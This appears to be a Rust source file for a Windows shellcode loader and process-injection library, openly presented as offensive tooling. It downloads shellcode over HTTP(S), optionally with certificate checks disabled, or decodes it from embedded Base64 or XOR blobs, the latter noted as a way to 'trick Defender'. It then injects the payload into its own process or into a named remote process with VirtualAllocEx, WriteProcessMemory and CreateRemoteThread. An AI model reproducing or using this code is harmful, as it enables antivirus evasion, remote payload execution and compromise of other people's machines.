// ================
// Standard Library
// ================
use core::ffi::c_void;
use std::ptr;
// =====================
// External Dependencies
// =====================
use base64::{engine::general_purpose, Engine as _};
use reqwest::blocking::Client;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, WAIT_EVENT},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
            PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
        },
        Threading::{
            CreateRemoteThread, GetCurrentProcess, OpenProcess, WaitForSingleObject, INFINITE,
            PROCESS_ALL_ACCESS,
        },
    },
};

///
/// A handy container for our shellcode. This is [InjectionType] and
/// [InjectorType] agnostic, beacuse our helpful [load()] function will
/// handle the transformation from source to shellcode.
///
pub struct Injector {
    pub shellcode: Vec<u8>,
}

///
/// The possible types of shellcode loaders. They are:
///
/// * `Url`: Raw Shellcode over HTTP(S), ignore_ssl (bool).
/// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S), ignore_ssl (bool).
/// * `Embedded`: You give the loader a raw [Vec<u8>]
///    of shellcode to inject
/// * `Base64Embedded`: Instead of a raw [Vec], you use b64
///    (n-iterations) to create an obfuscated shellcode string,
///    which will be decoded at runtime
/// *  `XorEmbedded`: Embedded shellcode with a seconde [Vec<u8>] as a decryption key. Not really
/// secure, but it'll trick Defender.
/// *  `XorUrl`: Pulls the XORed shellcode from the URL, ignore_ssl (bool), and uses the provided [Vec<u8>] for decryption.
///
///
pub enum InjectorType {
    Url(String, bool),
    Base64Url((String, bool, usize)),
    Embedded(Vec<u8>),
    Base64Embedded((String, usize)),
    XorEmbedded((Vec<u8>, Vec<u8>)),
    XorUrl((String, bool, Vec<u8>)),
}

///
/// The possible types of injections. Currently only
/// `Reflective` and `Remote` are supported.
///
pub enum InjectionType {
    Reflect,
    Remote(String),
}

///
/// The generic function to write memory to either
/// our own our another process, depending on the handle.
///
/// ## Safety
///
/// YOYO
///
pub unsafe fn write_mem(
    sc: Vec<u8>,
    proc_h: HANDLE,
    base_addr: *mut c_void,
    wait: bool,
) -> Result<(), String> {
    let sc_len = sc.len();
    let mut n = 0;
    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as _, sc_len, Some(&mut n)).unwrap();

    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
    VirtualProtectEx(
        proc_h,
        base_addr,
        sc_len,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    )
    .unwrap();

    let h_thread = CreateRemoteThread(
        proc_h,
        None,
        0,
        Some(std::mem::transmute(base_addr)),
        None,
        0,
        None,
    )
    .unwrap();

    CloseHandle(proc_h).unwrap();

    if wait {
        if WaitForSingleObject(h_thread, INFINITE) == WAIT_EVENT(0) {
            println!("Good!");
            println!("Injection completed!");
            Ok(())
        } else {
            let error = GetLastError();
            println!("{:?}", error);
            Err("Could not inject!".to_string())
        }
    } else {
        Ok(())
    }
}

///
/// Performs reflective injection.
///  
/// ## Safety
///
/// YOYO
///
pub unsafe fn reflective_inject(sc: Vec<u8>, wait: bool) -> Result<(), String> {
    let h: HANDLE = GetCurrentProcess();
    let addr = VirtualAllocEx(
        h,
        Some(ptr::null_mut()),
        sc.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    write_mem(sc, h, addr, wait)
}

///
/// Performs remote injection.
///
/// Will attempt to find a process with the given name and inject.
///  
/// ## Safety
///
/// YOYO
///
pub unsafe fn remote_inject(sc: Vec<u8>, wait: bool, process_name: &str) -> Result<(), String> {
    // Enumerate processes
    let sys = System::new_all();
    let mut process_matches = sys
        .processes()
        .iter()
        .filter(|(&_pid, proc)| proc.name() == process_name);

    match process_matches.next() {
        Some((pid, _proc)) => {
            let h: HANDLE =
                OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32()).unwrap();
            let addr = VirtualAllocEx(
                h,
                Some(ptr::null_mut()),
                sc.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            write_mem(sc, h, addr, wait)
        }
        None => Err("Could not find matching process!".to_string()),
    }
}

pub fn download_shellcode(url: &str, ignore_ssl: bool) -> Result<Vec<u8>, String> {
    println!("Requesting URL: {url}");

    // Build the client, optionally disabling SSL/TLS certificate validation
    let client_builder = Client::builder();
    let client = (
        if ignore_ssl {
            client_builder.danger_accept_invalid_certs(true)
        } else {
            client_builder
        }
    )
        .build()
        .map_err(|e| format!("Failed to build client: {}", e))?;

    // Send the request using the custom client
    let res = client
        .get(url)
        .send()
        .map_err(|e| format!("Request failed: {}", e))?;

    if res.status().is_success() {
        let sc: Vec<u8> = res
            .bytes()
            .map_err(|e| format!("Failed to read response bytes: {}", e))?
            .to_vec();
        Ok(sc)
    } else {
        Err("Couldn't connect!".to_string())
    }
}

///
/// Decodes base64 shellcode for `b64_iterations`.
///
pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u8>, String> {
    let mut shellcode_vec: Vec<u8> = sc.to_vec();
    for _i in 0..b64_iterations {
        match general_purpose::STANDARD.decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d;
            }
            Err(e) => {
                let err_msg = e.to_string();
                return Err(err_msg.to_owned());
            }
        };
    }
    Ok(shellcode_vec)
}

///
/// Simple XOR decryption
///
pub fn decrypt_xor(sc: &Vec<u8>, key: &Vec<u8>) -> Result<Vec<u8>, String> {
    let mut decrypted = Vec::with_capacity(sc.len());
    let mut i = 0;
    while i < sc.len() {
        decrypted.push(sc[i] ^ key[i % key.len()]);
        i += 1;
    }
    Ok(decrypted)
}
